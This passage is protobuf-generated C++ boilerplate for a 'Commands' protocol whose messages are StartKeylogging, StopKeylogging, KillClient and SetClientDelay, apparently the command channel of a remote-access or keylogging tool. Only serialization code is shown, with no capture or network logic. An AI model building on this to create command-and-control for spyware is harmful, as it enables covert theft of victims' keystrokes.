// @@protoc_insertion_point(message_byte_size_start:StartKeylogging)
  int total_size = 0;

  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = total_size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
  return total_size;
}

void StartKeylogging::MergeFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_merge_from_start:StartKeylogging)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  const StartKeylogging* source = 
      ::google::protobuf::internal::DynamicCastToGenerated<const StartKeylogging>(
          &from);
  if (source == NULL) {
  // @@protoc_insertion_point(generalized_merge_from_cast_fail:StartKeylogging)
    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
  } else {
  // @@protoc_insertion_point(generalized_merge_from_cast_success:StartKeylogging)
    MergeFrom(*source);
  }
}

void StartKeylogging::MergeFrom(const StartKeylogging& from) {
// @@protoc_insertion_point(class_specific_merge_from_start:StartKeylogging)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
}

void StartKeylogging::CopyFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_copy_from_start:StartKeylogging)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

void StartKeylogging::CopyFrom(const StartKeylogging& from) {
// @@protoc_insertion_point(class_specific_copy_from_start:StartKeylogging)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

bool StartKeylogging::IsInitialized() const {

  return true;
}

void StartKeylogging::Swap(StartKeylogging* other) {
  if (other == this) return;
  InternalSwap(other);
}
void StartKeylogging::InternalSwap(StartKeylogging* other) {
  _internal_metadata_.Swap(&other->_internal_metadata_);
  std::swap(_cached_size_, other->_cached_size_);
}

::google::protobuf::Metadata StartKeylogging::GetMetadata() const {
  protobuf_AssignDescriptorsOnce();
  ::google::protobuf::Metadata metadata;
  metadata.descriptor = StartKeylogging_descriptor_;
  metadata.reflection = StartKeylogging_reflection_;
  return metadata;
}

#if PROTOBUF_INLINE_NOT_IN_HEADERS
// StartKeylogging

#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS

// ===================================================================

#if !defined(_MSC_VER) || _MSC_VER >= 1900
#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900

StopKeylogging::StopKeylogging()
  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
  SharedCtor();
  // @@protoc_insertion_point(constructor:StopKeylogging)
}

void StopKeylogging::InitAsDefaultInstance() {
  _is_default_instance_ = true;
}

StopKeylogging::StopKeylogging(const StopKeylogging& from)
  : ::google::protobuf::Message(),
    _internal_metadata_(NULL) {
  SharedCtor();
  MergeFrom(from);
  // @@protoc_insertion_point(copy_constructor:StopKeylogging)
}

void StopKeylogging::SharedCtor() {
    _is_default_instance_ = false;
  _cached_size_ = 0;
}

StopKeylogging::~StopKeylogging() {
  // @@protoc_insertion_point(destructor:StopKeylogging)
  SharedDtor();
}

void StopKeylogging::SharedDtor() {
  if (this != default_instance_) {
  }
}

void StopKeylogging::SetCachedSize(int size) const {
  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
}
const ::google::protobuf::Descriptor* StopKeylogging::descriptor() {
  protobuf_AssignDescriptorsOnce();
  return StopKeylogging_descriptor_;
}

const StopKeylogging& StopKeylogging::default_instance() {
  if (default_instance_ == NULL) protobuf_AddDesc_Commands_2eproto();
  return *default_instance_;
}

StopKeylogging* StopKeylogging::default_instance_ = NULL;

StopKeylogging* StopKeylogging::New(::google::protobuf::Arena* arena) const {
  StopKeylogging* n = new StopKeylogging;
  if (arena != NULL) {
    arena->Own(n);
  }
  return n;
}

void StopKeylogging::Clear() {
// @@protoc_insertion_point(message_clear_start:StopKeylogging)
}

bool StopKeylogging::MergePartialFromCodedStream(
    ::google::protobuf::io::CodedInputStream* input) {
#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
  ::google::protobuf::uint32 tag;
  // @@protoc_insertion_point(parse_start:StopKeylogging)
  for (;;) {
    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
    tag = p.first;
    if (!p.second) goto handle_unusual;
  handle_unusual:
    if (tag == 0 ||
        ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
        ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
      goto success;
    }
    DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
  }
success:
  // @@protoc_insertion_point(parse_success:StopKeylogging)
  return true;
failure:
  // @@protoc_insertion_point(parse_failure:StopKeylogging)
  return false;
#undef DO_
}

void StopKeylogging::SerializeWithCachedSizes(
    ::google::protobuf::io::CodedOutputStream* output) const {
  // @@protoc_insertion_point(serialize_start:StopKeylogging)
  // @@protoc_insertion_point(serialize_end:StopKeylogging)
}

::google::protobuf::uint8* StopKeylogging::InternalSerializeWithCachedSizesToArray(
    bool deterministic, ::google::protobuf::uint8* target) const {
  // @@protoc_insertion_point(serialize_to_array_start:StopKeylogging)
  // @@protoc_insertion_point(serialize_to_array_end:StopKeylogging)
  return target;
}

int StopKeylogging::ByteSize() const {
// @@protoc_insertion_point(message_byte_size_start:StopKeylogging)
  int total_size = 0;

  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = total_size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
  return total_size;
}

void StopKeylogging::MergeFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_merge_from_start:StopKeylogging)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  const StopKeylogging* source = 
      ::google::protobuf::internal::DynamicCastToGenerated<const StopKeylogging>(
          &from);
  if (source == NULL) {
  // @@protoc_insertion_point(generalized_merge_from_cast_fail:StopKeylogging)
    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
  } else {
  // @@protoc_insertion_point(generalized_merge_from_cast_success:StopKeylogging)
    MergeFrom(*source);
  }
}

void StopKeylogging::MergeFrom(const StopKeylogging& from) {
// @@protoc_insertion_point(class_specific_merge_from_start:StopKeylogging)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
}

void StopKeylogging::CopyFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_copy_from_start:StopKeylogging)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

void StopKeylogging::CopyFrom(const StopKeylogging& from) {
// @@protoc_insertion_point(class_specific_copy_from_start:StopKeylogging)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

bool StopKeylogging::IsInitialized() const {

  return true;
}

void StopKeylogging::Swap(StopKeylogging* other) {
  if (other == this) return;
  InternalSwap(other);
}
void StopKeylogging::InternalSwap(StopKeylogging* other) {
  _internal_metadata_.Swap(&other->_internal_metadata_);
  std::swap(_cached_size_, other->_cached_size_);
}

::google::protobuf::Metadata StopKeylogging::GetMetadata() const {
  protobuf_AssignDescriptorsOnce();
  ::google::protobuf::Metadata metadata;
  metadata.descriptor = StopKeylogging_descriptor_;
  metadata.reflection = StopKeylogging_reflection_;
  return metadata;
}

#if PROTOBUF_INLINE_NOT_IN_HEADERS
// StopKeylogging

#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS

// ===================================================================

#if !defined(_MSC_VER) || _MSC_VER >= 1900
#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900

KillClient::KillClient()
  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
  SharedCtor();
  // @@protoc_insertion_point(constructor:KillClient)
}

void KillClient::InitAsDefaultInstance() {
  _is_default_instance_ = true;
}

KillClient::KillClient(const KillClient& from)
  : ::google::protobuf::Message(),
    _internal_metadata_(NULL) {
  SharedCtor();
  MergeFrom(from);
  // @@protoc_insertion_point(copy_constructor:KillClient)
}

void KillClient::SharedCtor() {
    _is_default_instance_ = false;
  _cached_size_ = 0;
}

KillClient::~KillClient() {
  // @@protoc_insertion_point(destructor:KillClient)
  SharedDtor();
}

void KillClient::SharedDtor() {
  if (this != default_instance_) {
  }
}

void KillClient::SetCachedSize(int size) const {
  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
}
const ::google::protobuf::Descriptor* KillClient::descriptor() {
  protobuf_AssignDescriptorsOnce();
  return KillClient_descriptor_;
}

const KillClient& KillClient::default_instance() {
  if (default_instance_ == NULL) protobuf_AddDesc_Commands_2eproto();
  return *default_instance_;
}

KillClient* KillClient::default_instance_ = NULL;

KillClient* KillClient::New(::google::protobuf::Arena* arena) const {
  KillClient* n = new KillClient;
  if (arena != NULL) {
    arena->Own(n);
  }
  return n;
}

void KillClient::Clear() {
// @@protoc_insertion_point(message_clear_start:KillClient)
}

bool KillClient::MergePartialFromCodedStream(
    ::google::protobuf::io::CodedInputStream* input) {
#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
  ::google::protobuf::uint32 tag;
  // @@protoc_insertion_point(parse_start:KillClient)
  for (;;) {
    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
    tag = p.first;
    if (!p.second) goto handle_unusual;
  handle_unusual:
    if (tag == 0 ||
        ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
        ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
      goto success;
    }
    DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
  }
success:
  // @@protoc_insertion_point(parse_success:KillClient)
  return true;
failure:
  // @@protoc_insertion_point(parse_failure:KillClient)
  return false;
#undef DO_
}

void KillClient::SerializeWithCachedSizes(
    ::google::protobuf::io::CodedOutputStream* output) const {
  // @@protoc_insertion_point(serialize_start:KillClient)
  // @@protoc_insertion_point(serialize_end:KillClient)
}

::google::protobuf::uint8* KillClient::InternalSerializeWithCachedSizesToArray(
    bool deterministic, ::google::protobuf::uint8* target) const {
  // @@protoc_insertion_point(serialize_to_array_start:KillClient)
  // @@protoc_insertion_point(serialize_to_array_end:KillClient)
  return target;
}

int KillClient::ByteSize() const {
// @@protoc_insertion_point(message_byte_size_start:KillClient)
  int total_size = 0;

  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = total_size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
  return total_size;
}

void KillClient::MergeFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_merge_from_start:KillClient)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  const KillClient* source = 
      ::google::protobuf::internal::DynamicCastToGenerated<const KillClient>(
          &from);
  if (source == NULL) {
  // @@protoc_insertion_point(generalized_merge_from_cast_fail:KillClient)
    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
  } else {
  // @@protoc_insertion_point(generalized_merge_from_cast_success:KillClient)
    MergeFrom(*source);
  }
}

void KillClient::MergeFrom(const KillClient& from) {
// @@protoc_insertion_point(class_specific_merge_from_start:KillClient)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
}

void KillClient::CopyFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_copy_from_start:KillClient)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

void KillClient::CopyFrom(const KillClient& from) {
// @@protoc_insertion_point(class_specific_copy_from_start:KillClient)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

bool KillClient::IsInitialized() const {

  return true;
}

void KillClient::Swap(KillClient* other) {
  if (other == this) return;
  InternalSwap(other);
}
void KillClient::InternalSwap(KillClient* other) {
  _internal_metadata_.Swap(&other->_internal_metadata_);
  std::swap(_cached_size_, other->_cached_size_);
}

::google::protobuf::Metadata KillClient::GetMetadata() const {
  protobuf_AssignDescriptorsOnce();
  ::google::protobuf::Metadata metadata;
  metadata.descriptor = KillClient_descriptor_;
  metadata.reflection = KillClient_reflection_;
  return metadata;
}

#if PROTOBUF_INLINE_NOT_IN_HEADERS
// KillClient

#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS

// ===================================================================

#if !defined(_MSC_VER) || _MSC_VER >= 1900
const int SetClientDelay::kDelayFieldNumber;
#endif  // !defined(_MSC_VER) || _MSC_VER >= 1900

SetClientDelay::SetClientDelay()
  : ::google::protobuf::Message(), _internal_metadata_(NULL) {
  SharedCtor();
  // @@protoc_insertion_point(constructor:SetClientDelay)
}

void SetClientDelay::InitAsDefaultInstance() {
  _is_default_instance_ = true;
}

SetClientDelay::SetClientDelay(const SetClientDelay& from)
  : ::google::protobuf::Message(),
    _internal_metadata_(NULL) {
  SharedCtor();
  MergeFrom(from);
  // @@protoc_insertion_point(copy_constructor:SetClientDelay)
}

void SetClientDelay::SharedCtor() {
    _is_default_instance_ = false;
  _cached_size_ = 0;
  delay_ = 0;
}

SetClientDelay::~SetClientDelay() {
  // @@protoc_insertion_point(destructor:SetClientDelay)
  SharedDtor();
}

void SetClientDelay::SharedDtor() {
  if (this != default_instance_) {
  }
}

void SetClientDelay::SetCachedSize(int size) const {
  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
}
const ::google::protobuf::Descriptor* SetClientDelay::descriptor() {
  protobuf_AssignDescriptorsOnce();
  return SetClientDelay_descriptor_;
}

const SetClientDelay& SetClientDelay::default_instance() {
  if (default_instance_ == NULL) protobuf_AddDesc_Commands_2eproto();
  return *default_instance_;
}

SetClientDelay* SetClientDelay::default_instance_ = NULL;

SetClientDelay* SetClientDelay::New(::google::protobuf::Arena* arena) const {
  SetClientDelay* n = new SetClientDelay;
  if (arena != NULL) {
    arena->Own(n);
  }
  return n;
}

void SetClientDelay::Clear() {
// @@protoc_insertion_point(message_clear_start:SetClientDelay)
  delay_ = 0;
}

bool SetClientDelay::MergePartialFromCodedStream(
    ::google::protobuf::io::CodedInputStream* input) {
#define DO_(EXPRESSION) if (!GOOGLE_PREDICT_TRUE(EXPRESSION)) goto failure
  ::google::protobuf::uint32 tag;
  // @@protoc_insertion_point(parse_start:SetClientDelay)
  for (;;) {
    ::std::pair< ::google::protobuf::uint32, bool> p = input->ReadTagWithCutoff(127);
    tag = p.first;
    if (!p.second) goto handle_unusual;
    switch (::google::protobuf::internal::WireFormatLite::GetTagFieldNumber(tag)) {
      // optional int32 delay = 1;
      case 1: {
        if (tag == 8) {
          DO_((::google::protobuf::internal::WireFormatLite::ReadPrimitive<
                   ::google::protobuf::int32, ::google::protobuf::internal::WireFormatLite::TYPE_INT32>(
                 input, &delay_)));

        } else {
          goto handle_unusual;
        }
        if (input->ExpectAtEnd()) goto success;
        break;
      }

      default: {
      handle_unusual:
        if (tag == 0 ||
            ::google::protobuf::internal::WireFormatLite::GetTagWireType(tag) ==
            ::google::protobuf::internal::WireFormatLite::WIRETYPE_END_GROUP) {
          goto success;
        }
        DO_(::google::protobuf::internal::WireFormatLite::SkipField(input, tag));
        break;
      }
    }
  }
success:
  // @@protoc_insertion_point(parse_success:SetClientDelay)
  return true;
failure:
  // @@protoc_insertion_point(parse_failure:SetClientDelay)
  return false;
#undef DO_
}

void SetClientDelay::SerializeWithCachedSizes(
    ::google::protobuf::io::CodedOutputStream* output) const {
  // @@protoc_insertion_point(serialize_start:SetClientDelay)
  // optional int32 delay = 1;
  if (this->delay() != 0) {
    ::google::protobuf::internal::WireFormatLite::WriteInt32(1, this->delay(), output);
  }

  // @@protoc_insertion_point(serialize_end:SetClientDelay)
}

::google::protobuf::uint8* SetClientDelay::InternalSerializeWithCachedSizesToArray(
    bool deterministic, ::google::protobuf::uint8* target) const {
  // @@protoc_insertion_point(serialize_to_array_start:SetClientDelay)
  // optional int32 delay = 1;
  if (this->delay() != 0) {
    target = ::google::protobuf::internal::WireFormatLite::WriteInt32ToArray(1, this->delay(), target);
  }

  // @@protoc_insertion_point(serialize_to_array_end:SetClientDelay)
  return target;
}

int SetClientDelay::ByteSize() const {
// @@protoc_insertion_point(message_byte_size_start:SetClientDelay)
  int total_size = 0;

  // optional int32 delay = 1;
  if (this->delay() != 0) {
    total_size += 1 +
      ::google::protobuf::internal::WireFormatLite::Int32Size(
        this->delay());
  }

  GOOGLE_SAFE_CONCURRENT_WRITES_BEGIN();
  _cached_size_ = total_size;
  GOOGLE_SAFE_CONCURRENT_WRITES_END();
  return total_size;
}

void SetClientDelay::MergeFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_merge_from_start:SetClientDelay)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  const SetClientDelay* source = 
      ::google::protobuf::internal::DynamicCastToGenerated<const SetClientDelay>(
          &from);
  if (source == NULL) {
  // @@protoc_insertion_point(generalized_merge_from_cast_fail:SetClientDelay)
    ::google::protobuf::internal::ReflectionOps::Merge(from, this);
  } else {
  // @@protoc_insertion_point(generalized_merge_from_cast_success:SetClientDelay)
    MergeFrom(*source);
  }
}

void SetClientDelay::MergeFrom(const SetClientDelay& from) {
// @@protoc_insertion_point(class_specific_merge_from_start:SetClientDelay)
  if (GOOGLE_PREDICT_FALSE(&from == this)) {
    ::google::protobuf::internal::MergeFromFail(__FILE__, __LINE__);
  }
  if (from.delay() != 0) {
    set_delay(from.delay());
  }
}

void SetClientDelay::CopyFrom(const ::google::protobuf::Message& from) {
// @@protoc_insertion_point(generalized_copy_from_start:SetClientDelay)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

void SetClientDelay::CopyFrom(const SetClientDelay& from) {
// @@protoc_insertion_point(class_specific_copy_from_start:SetClientDelay)
  if (&from == this) return;
  Clear();
  MergeFrom(from);
}

bool SetClientDelay::IsInitialized() const {

  return true;
}

void SetClientDelay::Swap(SetClientDelay* other) {
  if (other == this) return;
  InternalSwap(other);
}
void SetClientDelay::InternalSwap(SetClientDelay* other) {
  std::swap(delay_, other->delay_);
  _internal_metadata_.Swap(&other->_internal_metadata_);
  std::swap(_cached_size_, other->_cached_size_);
}

::google::protobuf::Metadata SetClientDelay::GetMetadata() const {
  protobuf_AssignDescriptorsOnce();
  ::google::protobuf::Metadata metadata;
  metadata.descriptor = SetClientDelay_descriptor_;
  metadata.reflection = SetClientDelay_reflection_;
  return metadata;
}

#if PROTOBUF_INLINE_NOT_IN_HEADERS
// SetClientDelay

// optional int32 delay = 1;
void SetClientDelay::clear_delay() {
  delay_ = 0;
}
 ::google::protobuf::int32 SetClientDelay::delay() const {
  // @@protoc_insertion_point(field_get:SetClientDelay.delay)
  return delay_;
}
 void SetClientDelay::set_delay(::google::protobuf::int32 value) {
  
  delay_ = value;
  // @@protoc_insertion_point(field_set:SetClientDelay.delay)
}

#endif  // PROTOBUF_INLINE_NOT_IN_HEADERS

// @@protoc_insertion_point(namespace_scope)

// @@protoc_insertion_point(global_scope)
